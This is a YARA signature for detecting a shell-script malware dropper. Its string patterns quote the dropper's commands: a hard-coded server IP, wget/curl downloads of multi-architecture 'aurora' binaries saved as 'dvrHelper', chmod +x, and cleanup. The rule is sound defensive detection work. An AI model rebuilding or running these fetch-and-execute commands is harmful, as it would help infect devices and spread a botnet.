rule SCRIPT_Dropper_Unknown_ForgeAuto_c2b60d18
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "c2b60d1860f4cfe72124076a5866ea534cd069e13d0aa1f232d09d6631e8c1a5"
        yarahub_uuid = "07fb2ed6-0b0e-436f-a151-634d75fcd66c"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "fa73356cc0eff3dc4e937b0877cb23d8"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "for Binary in $BINARIES; do" ascii
        $s1 = "WEBSERVER=\"94.183.174.80:80\"" ascii
        $s2 = "BINARIES=\"aurora.arm aurora.m68k auroraint.x86 auroraint.spc auroraint.sh4 auroraint.ppc auroraint.mpsl auroraint.mips auroraint.arm7 auroraint.arm5n auroraint.arm\"" ascii
        $s3 = "wget -q \"http://$WEBSERVER/bins/$Binary\" -O dvrHelper || curl -fsS \"http://$WEBSERVER/bins/$Binary\" -o dvrHelper" ascii
        $s4 = "aurora.arm aurora.m68k auroraint.x86 auroraint.spc auroraint.sh4 auroraint.ppc auroraint.mpsl auroraint.mips auroraint.arm7 auroraint.arm5n auroraint.arm" ascii
        $s5 = "http://$WEBSERVER/bins/$Binary" ascii
        $s6 = "chmod +x dvrHelper" ascii
        $s7 = "rm -f dvrHelper" ascii
        $s8 = "94.183.174.80:80" ascii
        $s9 = "dvrHelper" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s2, $s3, $s4, $s5, $s6, $s7, $s9) and 1 of ($s1, $s8)
}
